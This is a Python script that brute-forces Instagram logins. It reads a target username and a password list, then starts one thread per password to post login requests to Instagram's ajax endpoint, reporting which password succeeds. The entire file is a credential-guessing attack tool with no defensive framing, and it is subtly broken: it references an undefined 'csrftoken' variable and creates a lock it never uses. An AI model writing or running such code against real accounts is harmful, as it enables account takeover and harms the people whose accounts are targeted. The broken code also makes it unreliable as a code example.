import requests
import time
import threading
import sys
import os

def login_instagram(username, password):
    session = requests.Session()

    try:
        # Initial request to get CSRF token
        response = session.get('https://www.instagram.com/')
        csrf_token = response.cookies['csrftoken']

        # Prepare login data
        login_data = {
            'username': username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
            'queryParams': {},
            'optIntoOneTap': 'false'
        }
        headers = {
            'X-CSRFToken': csrftoken,
            'referer': 'https://www.instagram.com/accounts/login/'
        }

        # Send login request
        response = session.post('https://www.instagram.com/accounts/login/ajax/', data=login_data, headers=headers)
        response_data = response.json()

        # Check login response
        if response_data.get('authenticated') and response_data['authenticated'] is True:
            print(f"Password '{password}' is correct\n")
            return
        elif response_data.get('message'):
            print(f"Attempt with password '{password}' failed: {response_data['message']}\n")
        else:
            print(f"Attempt with password '{password}' failed.\n")

    except Exception as e:
        print(f"An error occurred: {str(e)}\n")

    finally:
        session.close()

def main():
    username = input("Enter Instagram username: ")
    print("Enter passwords separated by commas, or enter a file path to load passwords:")
    provided_passwords = input().split(',')
    load_from_file = len(provided_passwords) == 1 and os.path.exists(provided_passwords[0])

    if load_from_file:
        passwords = load_passwords(provided_passwords[0])
    else:
        passwords = [p.strip() for p in provided_passwords if p.strip()]

    if not passwords:
        print("No valid passwords provided. Exiting...")
        sys.exit(1)

    lock = threading.Lock()
    threads = []

    for password in passwords:
        thread = threading.Thread(target=login_instagram, args=(username, password))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

def load_passwords(file_path):
    if not os.path.exists(file_path):
        print(f"File '{file_path}' does not exist.")
        sys.exit(1)

    with open(file_path, 'r') as file:
        passwords = [line.strip() for line in file.readlines()]
    return passwords

if __name__ == "__main__":
    main()
